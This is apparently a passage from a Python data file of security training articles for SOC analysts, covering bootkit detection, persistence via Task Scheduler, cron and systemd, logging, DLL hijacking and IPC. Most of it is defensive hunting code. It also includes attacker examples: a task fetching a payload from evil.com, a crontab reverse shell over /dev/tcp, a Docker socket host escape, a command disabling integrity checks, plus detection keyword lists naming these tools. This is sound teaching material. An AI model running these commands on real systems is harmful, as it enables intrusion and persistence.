# {current}  - Current OS boot entry
#   device, osdevice - should be your OS partition
#   path - should be \Windows\system32\winload.efi
#   winpe - should NOT be set (attackers use WinPE for stealth)

# Disable Secure Boot enforcement (test environments only)
bcdedit /set {current} nointegritychecks on  # DANGEROUS - disables DSE
```

## Linux Boot: GRUB2

```
UEFI → grubx64.efi (signed by distro key)
    ↓
GRUB2 reads /boot/grub/grub.cfg
    ↓
Loads vmlinuz (kernel) and initrd (initial ramdisk)
    ↓
Kernel mounts real root filesystem
    ↓
init/systemd (PID 1) starts
```

```bash
# Verify kernel and initrd integrity
sha256sum /boot/vmlinuz-$(uname -r)
# Compare against package manager's expected hash:
rpm -V kernel        # RHEL/CentOS
debsums linux-image  # Debian/Ubuntu

# Check GRUB2 config for unexpected entries
cat /boot/grub/grub.cfg | grep -E "(menuentry|linux|initrd)"
```

## Detection: Bootkit Indicators

| Indicator | Tool | Notes |
|-----------|------|-------|
| MBR modified | `dd if=/dev/sda bs=512 count=1 | xxd` | Compare to baseline |
| Unexpected EFI files | `ls /boot/efi/EFI/` | Extra vendor dirs |
| BCD path anomaly | `bcdedit /enum` | Non-standard winload path |
| Secure Boot disabled | `mokutil --sb-state` (Linux) | Should be "enabled" |
| UEFI firmware changed | CHIPSEC framework | Compares against known-good |

```bash
# CHIPSEC — UEFI security analysis tool
# (requires root and kernel module)
python chipsec_main.py -m common.secureboot.variables
python chipsec_main.py -m common.bios_wp  # Check BIOS write protection
```
""",
    },
    {
        "title": "Scheduled Tasks and Persistence — Windows Task Scheduler, systemd, and cron",
        "tags": ["persistence", "scheduled-tasks", "systemd", "cron", "threat-hunting"],
        "content": r"""# Scheduled Tasks and Persistence — Windows Task Scheduler, systemd, and cron

## Windows Task Scheduler

Task Scheduler is a top-tier persistence mechanism abused by malware, APTs, and living-off-the-land attackers. Every task has a trigger, an action, and conditions.

### Task Storage Locations

```
XML task definitions:
C:\Windows\System32\Tasks\         (system tasks)
C:\Windows\SysWOW64\Tasks\         (32-bit tasks on 64-bit systems)
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\

Registry (legacy AT tasks):
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

### Enumeration and Analysis

```powershell
# List all scheduled tasks
Get-ScheduledTask | Select-Object TaskName, TaskPath, State |
    Sort-Object TaskPath

# Detailed view of a specific task
Get-ScheduledTask -TaskName "MyTask" | Get-ScheduledTaskInfo

# Find tasks with suspicious actions (non-system32 executables)
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $_.Actions | ForEach-Object {
        if ($_.Execute -notmatch "System32|SysWOW64|Program Files") {
            [PSCustomObject]@{
                Name    = $task.TaskName
                Path    = $task.TaskPath
                Execute = $_.Execute
                Args    = $_.Arguments
            }
        }
    }
} | Where-Object {$_ -ne $null}

# Hunt for recently created/modified tasks
Get-ChildItem "C:\Windows\System32\Tasks\" -Recurse |
    Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |
    Select-Object FullName, LastWriteTime
```

### Persistence Trigger Types

| Trigger | Use by Attackers | Notes |
|---------|-----------------|-------|
| AtLogon | Common | Runs when any/specific user logs in |
| AtStartup | Common | Runs at system boot (SYSTEM context) |
| Daily/Weekly | Common | Regular beacon/checkin |
| OnEvent | Sophisticated | Triggers on specific Event Log ID |
| OnIdle | Rare | Runs when system idle |
| SessionStateChange | Rare | On lock/unlock |

```powershell
# Create a persistence task (attacker technique — for lab use)
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdateHelper" `
    -Action $action -Trigger $trigger -RunLevel Highest

# Detection: look for base64/IEX/DownloadString in task actions
Get-ScheduledTask | ForEach-Object {
    $_.Actions | Where-Object {$_.Arguments -match "base64|IEX|DownloadString|WebClient"}
} | Select-Object @{N='Task';E={$_.TaskName}}
```

## Linux cron

cron is the traditional Unix job scheduler. Multiple crontab locations must all be checked:

```
/etc/crontab            → System crontab (edited directly, has username field)
/etc/cron.d/            → Drop-in crontabs (package/app specific)
/etc/cron.hourly/       → Scripts run hourly by cron
/etc/cron.daily/        → Scripts run daily
/etc/cron.weekly/       → Scripts run weekly
/etc/cron.monthly/      → Scripts run monthly
/var/spool/cron/crontabs/<user>  → Per-user crontabs
```

```bash
# Enumerate all cron jobs on a system
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -l -u $user 2>/dev/null | grep -v "^#" | grep -v "^$" |
        awk -v u="$user" '{print u": "$0}'
done

# List /etc/cron.d entries
ls -la /etc/cron.d/
cat /etc/cron.d/*

# Recent crontab modifications (persistence indicator)
find /var/spool/cron/ /etc/cron* -newer /etc/passwd -ls 2>/dev/null

# Cron syntax:
# ┌─ minute (0-59)
# │ ┌─ hour (0-23)
# │ │ ┌─ day of month (1-31)
# │ │ │ ┌─ month (1-12)
# │ │ │ │ ┌─ day of week (0-7, 0=7=Sunday)
# │ │ │ │ │
# * * * * * /path/to/command
```

### cron Persistence Example (Red Team / Detection)

```bash
# Attacker adds reverse shell to root crontab
echo "* * * * * root /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" \
    >> /etc/crontab

# Detection: Monitor /etc/crontab for changes
# auditd rule:
echo '-w /etc/crontab -p wa -k cron_modification' >> /etc/audit/rules.d/cron.rules
echo '-w /etc/cron.d/ -p wa -k cron_modification' >> /etc/audit/rules.d/cron.rules
auditctl -R /etc/audit/rules.d/cron.rules

# Check auditd logs for cron changes
ausearch -k cron_modification --start today
```

## systemd Timers (Modern Linux)

systemd timers are the modern replacement for cron, with richer features:

```
/etc/systemd/system/        → System-level units
/usr/lib/systemd/system/    → Package-provided units
~/.config/systemd/user/     → Per-user units (no root needed!)
```

A timer requires two files: a `.timer` unit and a `.service` unit.

```ini
# /etc/systemd/system/backdoor.timer
[Unit]
Description=Totally Legitimate Update Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target

# /etc/systemd/system/backdoor.service
[Unit]
Description=Totally Legitimate Update Service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/update_helper.sh
```

```bash
# List all timers (including next run time)
systemctl list-timers --all

# Find unusual user-level timers (no root required — stealthy persistence)
find /home -name "*.timer" -o -name "*.service" 2>/dev/null |
    xargs grep -l "ExecStart" 2>/dev/null

# Check enabled timers
systemctl list-unit-files --type=timer | grep enabled

# Verify unit files haven't been tampered with (on package-managed systems)
rpm -V systemd    # RHEL
debsums systemd   # Debian
```

## macOS: LaunchDaemons and LaunchAgents

macOS equivalents (included for completeness):

```
/Library/LaunchDaemons/          → System-wide, run as root, on boot
/Library/LaunchAgents/           → System-wide, run as user, on login
~/Library/LaunchAgents/          → Per-user, on login
/System/Library/LaunchDaemons/   → Apple system components
```

```bash
# List all launch items
launchctl list | grep -v "^-"

# Check for suspicious items (non-Apple, recently added)
find /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents \
    -newer /etc/hosts -ls 2>/dev/null
```

## Persistence Hunting Checklist

```
Windows:
[ ] HKLM\...\Run and RunOnce keys
[ ] HKCU\...\Run and RunOnce keys
[ ] Scheduled Tasks (Get-ScheduledTask)
[ ] Services (Get-Service | Where-Object {$_.StartType -eq 'Automatic'})
[ ] Startup folder (shell:startup, shell:common startup)
[ ] AppInit_DLLs, Winlogon keys
[ ] IFEO Debugger subkeys

Linux/macOS:
[ ] /etc/crontab, /etc/cron.d/, /var/spool/cron/
[ ] systemctl list-timers, list-units --type=service
[ ] ~/.bashrc, ~/.bash_profile, ~/.profile
[ ] /etc/rc.local, /etc/init.d/
[ ] LaunchDaemons/LaunchAgents (macOS)
[ ] /etc/ld.so.preload (LD_PRELOAD persistence)
```
""",
    },
    {
        "title": "System Logging Architecture — Windows Event Log, syslog, and journald",
        "tags": ["logging", "event-log", "syslog", "journald", "siem", "os-internals"],
        "content": r"""# System Logging Architecture — Windows Event Log, syslog, and journald

## Why Logging Architecture Matters

Security monitoring is only as good as the logs feeding it. Understanding where logs come from, how they flow, and where they can be tampered with is foundational for both detection engineers and analysts.

## Windows Event Log

### Architecture

Windows Event Log uses a structured binary format (`EVTX`) with an XML event schema. The service (`Windows Event Log` / `EventLog`) collects events from all registered providers.

```
Event Sources → EventLog Service → EVTX Files
     ↑
Kernel (ETW), Applications, Services, Security Subsystem (lsass)
```

**Event Tracing for Windows (ETW)**: The underlying telemetry infrastructure. Security products (EDR, AV) use ETW to receive real-time notifications of system events without polling.

### Key Log Files

```
C:\Windows\System32\winevt\Logs\

Security.evtx       → Authentication, privilege use, object access (needs audit policy)
System.evtx         → OS and service events, hardware errors
Application.evtx    → Application errors and information
Microsoft-Windows-PowerShell/Operational.evtx → PowerShell execution (critical!)
Microsoft-Windows-Sysmon/Operational.evtx     → If Sysmon installed
Microsoft-Windows-Windows Defender/Operational.evtx → AV events
Microsoft-Windows-TerminalServices-*/Operational.evtx → RDP sessions
```

### Critical Security Event IDs

| Event ID | Description | When to Alert |
|----------|-------------|---------------|
| 4624 | Successful logon | Logon Type 3/10 from unexpected IPs |
| 4625 | Failed logon | Brute force patterns |
| 4648 | Logon with explicit credentials | Pass-the-hash, runas |
| 4662 | Object operation in AD | DCSync detection (replication rights) |
| 4688 | Process creation (requires audit) | Malicious command lines |
| 4697 | Service installed | Malware service persistence |
| 4698 | Scheduled task created | Persistence |
| 4720 | User account created | Backdoor accounts |
| 4732 | Member added to security group | Privilege escalation |
| 4756 | Member added to Universal group | Same |
| 7045 | New service installed (System log) | Malware services |
| 1102 | Audit log cleared | Cover tracks |
| 4719 | Audit policy changed | Disable logging |

```powershell
# Query Security log for failed logons in last hour
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
    StartTime = (Get-Date).AddHours(-1)
} | Select-Object TimeCreated,
    @{N='AccountName';E={$_.Properties[5].Value}},
    @{N='LogonType';E={$_.Properties[10].Value}},
    @{N='SourceIP';E={$_.Properties[19].Value}}

# Detect log clearing
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} |
    Select-Object TimeCreated, Message -First 10
```

### Windows Event Forwarding (WEF)

Centralizes logs without a SIEM agent:
```
Endpoints (WinRM source) → Windows Event Collector (WEC server) → EVTX aggregation
```

```powershell
# Configure subscription on collector
wecutil cs subscription.xml

# On endpoints: set collector URL
winrm set winrm/config/client @{TrustedHosts="collector.corp.com"}
```

## Linux syslog

### syslog Architecture

Traditional Unix logging uses a facility/severity system. Modern systems use `rsyslog` or `syslog-ng` as the syslog daemon.

```
Applications → /dev/log (Unix socket) → rsyslogd → log files / remote
Kernel → /dev/kmsg → rsyslogd
```

**Facilities**: auth/authpriv, kern, daemon, mail, cron, local0-7...
**Severities**: emerg(0), alert(1), crit(2), err(3), warning(4), notice(5), info(6), debug(7)

```
/var/log/
├── auth.log / secure   → Authentication events (SSH, sudo, PAM)
├── syslog / messages   → General system events
├── kern.log            → Kernel messages
├── daemon.log          → Background service logs
├── cron.log / cron     → Cron job execution
├── mail.log            → Mail server events
└── audit/audit.log     → auditd events (detailed security events)
```

```bash
# Tail authentication events
tail -f /var/log/auth.log

# Search for SSH failures
grep "Failed password" /var/log/auth.log | \
    awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Monitor sudo usage
grep "sudo" /var/log/auth.log | grep "COMMAND"
```

### rsyslog Remote Forwarding

```bash
# /etc/rsyslog.conf — forward all logs to SIEM
# TCP (reliable)
*.* @@siem.corp.com:514

# UDP (lower overhead)
*.* @siem.corp.com:514

# Forward only auth and critical to SIEM
auth,authpriv.* @@siem.corp.com:514
*.crit @@siem.corp.com:514
```

### auditd — Detailed Linux Auditing

`auditd` provides syscall-level auditing:

```bash
# Common audit rules
# Track file reads/writes on sensitive files
-w /etc/passwd -p rwa -k passwd_changes
-w /etc/shadow -p rwa -k shadow_changes
-w /etc/sudoers -p rwa -k sudoers_changes
-w /root/.ssh/ -p rwa -k root_ssh

# Track privilege escalation
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -k privilege_escalation

# Track network connections
-a always,exit -F arch=b64 -S connect -k network_connections

# Load rules
auditctl -R /etc/audit/rules.d/audit.rules

# Search audit log
ausearch -k passwd_changes --start today
ausearch -x /bin/bash --start today  # All bash executions
aureport --logins --failed  # Failed logins summary
```

## systemd journald

`journald` is systemd's structured logging daemon, storing logs in a binary format with rich metadata:

```bash
# View all recent logs
journalctl -xe

# Follow logs in real-time
journalctl -f

# Filter by unit
journalctl -u sshd.service
journalctl -u nginx.service --since "1 hour ago"

# Filter by priority (err and above)
journalctl -p err

# Show kernel messages
journalctl -k

# Filter by PID
journalctl _PID=1234

# Export to JSON (for SIEM ingestion)
journalctl -o json --since "1 hour ago" > /tmp/logs.json

# Show boot logs
journalctl -b        # Current boot
journalctl -b -1     # Previous boot

# Verify journal integrity (if FSS enabled)
journalctl --verify
```

### journald Forwarding to syslog

```ini
# /etc/systemd/journald.conf
[Journal]
ForwardToSyslog=yes     # Forward to rsyslog for remote shipping
Storage=persistent      # Keep logs across reboots (vs volatile)
Compress=yes            # Compress older entries
SystemMaxUse=2G         # Cap disk usage
```

## Log Tampering Detection

Attackers clear logs to cover tracks. Detection strategies:

```bash
# Windows: Monitor for log clearing
# Event 1102 (Security log cleared) — should always alert

# Linux: Make logs append-only with chattr
chattr +a /var/log/auth.log  # Can only append, not modify/delete

# Detect gaps in log sequences
# journald has sequence numbers — gaps indicate deletion
journalctl --list-boots  # Should show continuous sequence

# Linux: auditd tamper detection
# Watch the audit log itself
-w /var/log/audit/ -p rwa -k audit_log_tamper

# Send logs off-system immediately
# Any logs still on the compromised system should be treated as unreliable
```

## SIEM Integration Checklist

For each log source, analysts should know:
1. **Format**: EVTX, syslog RFC3164/RFC5424, JSON, CEF, LEEF
2. **Transport**: WEF, rsyslog TCP/UDP, Beats agent, API pull
3. **Latency**: Real-time vs batched (affects alert response time)
4. **Completeness**: Is audit policy configured to generate needed events?
5. **Integrity**: Are logs signed/sealed? Off-system backup?
6. **Retention**: How long are raw logs kept for investigation?
""",
    },
    {
        "title": "DLL Loading and Search Order — How Windows Resolves Libraries",
        "tags": ["windows", "dll", "dll-hijacking", "search-order", "persistence", "os-internals"],
        "content": r"""# DLL Loading and Search Order — How Windows Resolves Libraries

## Why DLL Search Order Matters for Security

DLL hijacking is one of the most reliable Windows persistence and privilege escalation techniques. Understanding exactly how Windows resolves DLL names gives analysts the knowledge to hunt for hijacks and understand vulnerable conditions.

## The DLL Search Order

When a Windows application calls `LoadLibrary("example.dll")` without a full path, Windows searches these locations in order:

```
1. DLLs already loaded in memory (KnownDLLs + already-loaded modules)
2. The application's directory (same folder as the .exe)
3. System directory: C:\Windows\System32\
4. 16-bit system directory: C:\Windows\System\
5. Windows directory: C:\Windows\
6. Current Working Directory (CWD)
7. PATH environment variable directories (left to right)
```

**KnownDLLs**: A registry key listing DLLs that Windows pre-loads and caches. These are immune to search-order hijacking because they're resolved before the search begins:
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
```

## DLL Hijacking Techniques

### Classic Search Order Hijacking

If an application loads a DLL by name (not full path) and the DLL is not in KnownDLLs, placing a malicious DLL earlier in the search path hijacks the load:

```
Legitimate flow:
App.exe (in C:\Program Files\App\) loads "helper.dll"
→ Checks C:\Program Files\App\helper.dll  (NOT FOUND)
→ Checks C:\Windows\System32\helper.dll   (FOUND — legitimate)

Attack: place malicious helper.dll in C:\Program Files\App\
→ Checks C:\Program Files\App\helper.dll  (FOUND — malicious)
→ Malicious DLL executes, then loads real DLL from System32
```

### CWD Hijacking

Applications running from user-writable directories are vulnerable. Browsers, document viewers, and development tools often run with a writable CWD.

```
Example: Excel opens a document in C:\Users\user\Downloads\
If Excel tries to load a DLL not in system paths, and attacker places
malicious.dll in Downloads\, it gets loaded.
```

### Phantom DLL Loading

Some legitimate Windows applications try to load DLLs that don't exist on the system. Placing these "missing" DLLs in the application directory gives execution:

```powershell
# Use Process Monitor to find phantom DLL loads
# Filter: Result = "NAME NOT FOUND" AND Path ends with ".dll"
# This reveals DLL names apps search for but don't find

# Common phantom DLLs discovered via procmon:
# wbemcomn.dll, WptsExtensions.dll, TSMSISrv.dll
```

### Phantom DLL Hijacking via PATH

If an attacker can write to a directory early in the PATH, they can plant DLLs loaded by processes searching that directory:

```powershell
# Check PATH for writable directories (privilege escalation vector)
$env:PATH -split ";" | ForEach-Object {
    if (Test-Path $_) {
        $acl = Get-Acl $_
        $writable = $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl" -and
            $_.IdentityReference -match "Users|Everyone|Authenticated Users"
        }
        if ($writable) {
            Write-Warning "Writable PATH entry: $_"
        }
    }
}
```

## DLL Side-Loading

DLL side-loading abuses legitimate signed executables to load malicious DLLs. The signed binary provides trust while the malicious DLL provides the payload:

```
Legitimate signed binary: C:\ProgramData\App\legitimate_signed.exe
Malicious DLL:            C:\ProgramData\App\dependency.dll  (planted by attacker)

When legitimate_signed.exe runs, it loads dependency.dll from its own directory.
Security products see a signed process — the malicious DLL gets a free pass.
```

**Real-world examples**: Threat actors (APT groups, ransomware) commonly use this with:
- `rundll32.exe`, `regsvr32.exe`
- Signed AV/security tool executables with missing DLL dependencies
- Microsoft Office, Notepad++, 7-Zip components

## Detection Strategies

### Process Monitor (Live Analysis)

```
Filters to apply in ProcMon:
- Operation: Load Image
- Result: SUCCESS
- Path: not in C:\Windows\, not in C:\Program Files\

Any DLL loading from user-writable locations (Downloads, Temp, AppData)
without a full path is suspicious.
```

### PowerShell Hunting

```powershell
# Find DLLs loaded from unusual locations
Get-Process | ForEach-Object {
    try {
        $proc = $_
        $modules = $proc.Modules
        foreach ($mod in $modules) {
            $path = $mod.FileName
            if ($path -and
                $path -notmatch "^C:\\Windows\\" -and
                $path -notmatch "^C:\\Program Files") {
                [PSCustomObject]@{
                    Process  = $proc.Name
                    PID      = $proc.Id
                    DLL      = $mod.ModuleName
                    Path     = $path
                }
            }
        }
    } catch {}
} | Where-Object {$_ -ne $null} | Sort-Object Process
```

### Sysmon Detection

```xml
<!-- Sysmon config: detect DLL loads from user-writable paths -->
<RuleGroup name="" groupRelation="or">
  <ImageLoad onmatch="include">
    <ImageLoaded condition="contains">\Users\</ImageLoaded>
    <ImageLoaded condition="contains">\Temp\</ImageLoaded>
    <ImageLoaded condition="contains">\AppData\</ImageLoaded>
    <ImageLoaded condition="contains">\Downloads\</ImageLoaded>
    <ImageLoaded condition="contains">\ProgramData\</ImageLoaded>
  </ImageLoad>
</RuleGroup>
```

## Defenses Against DLL Hijacking

**Safe DLL Search Mode** (enabled by default since Windows XP SP2): Moves CWD to position 6 (after System32 and Windows directories). Disable with registry key `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode = 0`.

**Manifest and absolute paths**: Applications should load DLLs using full absolute paths (`LoadLibraryEx` with `LOAD_LIBRARY_SEARCH_SYSTEM32`).

**KnownDLLs**: Adding frequently-hijacked DLLs to the KnownDLLs registry key protects them.

**Windows Defender Application Control (WDAC) / AppLocker**: Block DLL loads from user-writable locations.

**Principle of least privilege**: Applications shouldn't run in writable directories. Use `C:\Program Files\` (requires admin to write) not `C:\ProgramData\` or user directories.
""",
    },
    {
        "title": "Inter-Process Communication — Pipes, Sockets, Shared Memory, and RPC",
        "tags": ["ipc", "pipes", "sockets", "rpc", "named-pipes", "lateral-movement", "os-internals"],
        "content": r"""# Inter-Process Communication — Pipes, Sockets, Shared Memory, and RPC

## Why IPC Matters for Security Analysts

IPC mechanisms are the arteries of Windows and Linux systems. Attackers abuse them for:
- **Lateral movement** (SMB named pipes, WMI)
- **Process injection** (writing shellcode via shared memory)
- **C2 communication** (named pipe C2, socket-based beaconing)
- **Privilege escalation** (impersonating pipe clients)

## Anonymous Pipes

Anonymous pipes provide one-way communication between parent and child processes. They are the mechanism behind shell redirection:

```bash
# Unix: pipe between processes
ls -la | grep ".txt"
# ls's stdout → pipe → grep's stdin

# Shell scripting: pipes are anonymous
cat /var/log/auth.log | grep "Failed" | awk '{print $11}' | sort | uniq -c
```

```powershell
# PowerShell pipeline uses .NET objects, not byte streams
Get-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU
```

Anonymous pipes don't have names and can't be accessed by unrelated processes.

## Named Pipes

Named pipes have filesystem paths and can be accessed by any process with permission. They are a primary Windows IPC mechanism and a major attack surface.

### Windows Named Pipes

```
\\.\pipe\                    ← Local pipe root
\\server\pipe\               ← Remote pipe (over SMB)

Examples:
\\.\pipe\lsass               ← LSASS communication
\\.\pipe\atsvc               ← Task Scheduler
\\.\pipe\svcctl              ← Service Control Manager
\\.\pipe\ntsvcs              ← Plug and Play
\\.\pipe\mojo.*              ← Chrome/Chromium IPC
```

```powershell
# List all named pipes on local system
[System.IO.Directory]::GetFiles('\\.\\pipe\\') | Sort-Object

# Or via Sysinternals pipelist.exe
pipelist.exe /accepteula

# Hunt for suspicious named pipes (malware often uses random names or mimics system pipes)
[System.IO.Directory]::GetFiles('\\.\\pipe\\') |
    Where-Object {$_ -match "meterpreter|msf|cobaltstrike|beacon"} |
    ForEach-Object {Write-Warning "Suspicious pipe: $_"}
```

**Attacker abuse — Named Pipe C2**: Tools like Cobalt Strike use named pipes for:
1. Peer-to-peer C2 between beacons (chained via named pipes — avoids network IOCs)
2. Privilege escalation: creating a pipe, tricking a privileged process to connect, then impersonating it

```powershell
# Named pipe impersonation (attacker technique — simplified)
# Attacker creates pipe, waits for victim process to connect
# Then calls ImpersonateNamedPipeClient() to assume victim's identity

# Detection: Monitor for unexpected pipe connections
# Sysmon Event ID 17 (Pipe Created) and 18 (Pipe Connected)
```

### Linux Named Pipes (FIFOs)

```bash
# Create a named pipe
mkfifo /tmp/mypipe

# Two-terminal example:
# Terminal 1: cat /tmp/mypipe   (reader blocks)
# Terminal 2: echo "hello" > /tmp/mypipe   (writer unblocks reader)

# Security: FIFOs have standard Unix permissions
ls -la /tmp/mypipe
prw-r--r-- 1 user group 0 Mar 15 10:00 /tmp/mypipe
# 'p' in permissions = pipe

# Find suspicious FIFOs
find /tmp /var /dev/shm -type p 2>/dev/null
```

## Sockets

### Unix Domain Sockets

File-based sockets for local IPC — faster than TCP/UDP for local communication:

```bash
# List Unix sockets
ss -x           # Socket statistics
ls /run/*.sock  # Common socket locations

# Important system sockets
/run/systemd/private/   ← systemd internal
/run/docker.sock        ← Docker daemon (CRITICAL — gives root equivalent access)
/var/run/mysqld/mysqld.sock ← MySQL local connections
```

**Docker socket escalation**: Any process with access to `/run/docker.sock` can escape to root on the host:
```bash
# Attacker mounts host filesystem via Docker socket
curl --unix-socket /run/docker.sock http://localhost/containers/json
docker -H unix:///run/docker.sock run -v /:/host -it alpine chroot /host sh
```

### TCP/UDP Sockets

Standard network sockets used for both legitimate IPC and C2:

```bash
# View all listening and established connections
ss -tulpn          # Linux: TCP+UDP listening + PIDs
netstat -tulpn     # Older Linux/cross-platform
lsof -i -P -n      # List open files including sockets

# PowerShell
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
Get-NetTCPConnection | Where-Object {$_.RemoteAddress -ne "0.0.0.0"} |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State,
    @{N='Process';E={(Get-Process -Id $_.OwningProcess).Name}}
```

## Shared Memory

Allows multiple processes to map the same physical memory region — fastest IPC mechanism.

### Windows (Section Objects)

```powershell
# Shared memory appears as section objects in the kernel
# Process injection via shared memory (technique):
# 1. Attacker creates file mapping (CreateFileMapping)
# 2. Maps into attacker process (MapViewOfFile)
# 3. Writes shellcode
# 4. Maps into target process (OpenProcess + MapViewOfFile)
# 5. Creates remote thread in target at shellcode address

# Detection: Sysmon Event ID 17 (CreateRemoteThread) combined with
# memory regions mapped from external processes
```

### Linux (POSIX Shared Memory)

```bash
# List shared memory segments
ipcs -m              # SysV shared memory
ls /dev/shm/         # POSIX shared memory

# Security concern: /dev/shm is world-writable tmpfs — common staging area for malware
find /dev/shm -type f 2>/dev/null   # Regular files here are suspicious
ls -la /dev/shm/

# Clean shared memory (incident response)
ipcrm -m <shmid>
rm /dev/shm/<suspicious_file>
```

## RPC (Remote Procedure Call)

RPC enables calling functions in remote processes (same machine or network) as if they were local.

### Windows RPC / DCOM

```
Client → RPC Runtime → Endpoint Mapper (:135) → Server endpoint → Server process
```

**DCOM (Distributed COM)**: Extends COM over RPC, enabling remote object instantiation. Heavily used by Windows management interfaces.

```powershell
# DCOM-based lateral movement (attackers use WMI, MMC, Excel, etc.)
# WMI exec (Invoke-WmiMethod)
Invoke-WmiMethod -ComputerName target.corp.com -Class Win32_Process `
    -Name Create -ArgumentList "calc.exe"

# DCOMExec via Excel (LOLBin)
# [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))

# Detection: Event ID 4624 (Network logon) + unusual DCOM activations
# Sysmon: Process creation with parent = WmiPrvSE.exe, mmc.exe, excel.exe
```

### Linux RPC (rpcbind)

```bash
# List RPC services
rpcinfo -p localhost

# NFS, NIS, and other RPC services visible here
# Unnecessary RPC services should be disabled

# Disable rpcbind if not needed
systemctl disable rpcbind
systemctl stop rpcbind
```

## IPC Security Summary for Analysts

| Mechanism | OS | Attack Use | Detection |
|-----------|----|-----------| ---------|
| Named Pipes | Windows | C2, impersonation, lateral movement | Sysmon EID 17/18, pipe enumeration |
| Unix Sockets | Linux | Docker escape (/run/docker.sock) | `ss -x`, file permissions |
| Shared Memory | Both | Process injection, data staging | `ipcs -m`, `/dev/shm` monitoring |
| DCOM/RPC | Windows | Lateral movement, execution | EID 4624 + WMI process creation |
| TCP Sockets | Both | C2 beacons, reverse shells | `netstat`/`ss`, connection baselining |

Establishing a baseline of normal IPC activity on your systems makes anomalous pipes, sockets, and connections stand out clearly during investigations.
""",
    },
]

SECURITY_SCRIPTING = [
    {
        "title": "PowerShell for SOC Analysts — Log Parsing, Event Queries, and Automation",
        "tags": ["powershell", "soc", "log-analysis", "automation", "scripting"],
        "content": r"""# PowerShell for SOC Analysts — Log Parsing, Event Queries, and Automation

## PowerShell as a SOC Tool

PowerShell is the Swiss Army knife of Windows administration and security analysis. Analysts who master it can query event logs, hunt threats, and automate repetitive tasks without installing extra tools.

## Essential Cmdlets for Analysts

```powershell
# Core cmdlets
Get-WinEvent          # Query Windows Event Logs (preferred over Get-EventLog)
Get-Process           # Running processes
Get-Service           # Services and startup types
Get-NetTCPConnection  # Active network connections
Get-ItemProperty      # Registry value retrieval
Invoke-Command        # Remote execution (WinRM)
Where-Object          # Filter pipeline output
Select-Object         # Shape and rename fields
Sort-Object           # Sort by field
Group-Object          # Group and count
Measure-Object        # Compute statistics
ForEach-Object        # Iterate
```

## Querying the Windows Event Log

```powershell
# FilterHashtable — fastest, uses log indexes
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4625           # Failed logon
    StartTime = (Get-Date).AddHours(-24)
}

# XPath filter — powerful, surgical
$xpath = @"
*[System[(EventID=4688) and TimeCreated[timediff(@SystemTime) <= 3600000]]]
and
*[EventData[Data[@Name='CommandLine'][contains(., 'powershell')]]]
"@
Get-WinEvent -LogName Security -FilterXPath $xpath

# Extract structured fields from XML event data
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
    ForEach-Object {
        $xml  = [xml]$_.ToXml()
        $data = $xml.Event.EventData.Data
        [PSCustomObject]@{
            Time        = $_.TimeCreated
            AccountName = ($data | Where-Object {$_.Name -eq 'TargetUserName'}).'#text'
            LogonType   = ($data | Where-Object {$_.Name -eq 'LogonType'}).'#text'
            SourceIP    = ($data | Where-Object {$_.Name -eq 'IpAddress'}).'#text'
        }
    } | Where-Object {$_.LogonType -eq '3'} | Sort-Object Time -Descending
```

## Process Creation Hunting (Event ID 4688)

Requires audit policy: **Audit Process Creation = Success** and **Include command line in process creation events = Enabled** (via Group Policy or `auditpol.exe`).

```powershell
$suspiciousPatterns = @(
    'powershell.*-enc',       # Encoded commands
    'powershell.*-w.*hidden', # Hidden window
    'certutil.*-decode',      # certutil abuse
    'regsvr32.*scrobj',       # Squiblydoo
    'mshta.*http',            # MSHTA remote payload
    'bitsadmin.*transfer',    # BITS abuse
    'wscript.*\.vbs'          # VBS execution
)
$pattern = $suspiciousPatterns -join '|'

Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddDays(-1)} |
    ForEach-Object {
        $xml     = [xml]$_.ToXml()
        $data    = $xml.Event.EventData.Data
        $cmdLine = ($data | Where-Object {$_.Name -eq 'CommandLine'}).'#text'
        if ($cmdLine -match $pattern) {
            [PSCustomObject]@{
                Time    = $_.TimeCreated
                Process = ($data | Where-Object {$_.Name -eq 'NewProcessName'}).'#text'
                CmdLine = $cmdLine
            }
        }
    } | Format-Table -AutoSize -Wrap
```

## PowerShell Script Block Logging (Event ID 4104)

Script block logging captures the full content of every PowerShell script block executed — the highest-value PowerShell telemetry for defenders.

```powershell
# Enable via Group Policy or registry
# HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
# EnableScriptBlockLogging = 1

# Hunt for malicious PowerShell activity
$maliciousKeywords = 'IEX|Invoke-Expression|DownloadString|WebClient|' +
                     'FromBase64String|System\.Reflection\.Assembly|' +
                     'Invoke-Mimikatz|Invoke-Shellcode|ShellCode'

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
    Where-Object {$_.Id -eq 4104 -and $_.Message -match $maliciousKeywords} |
    ForEach-Object {
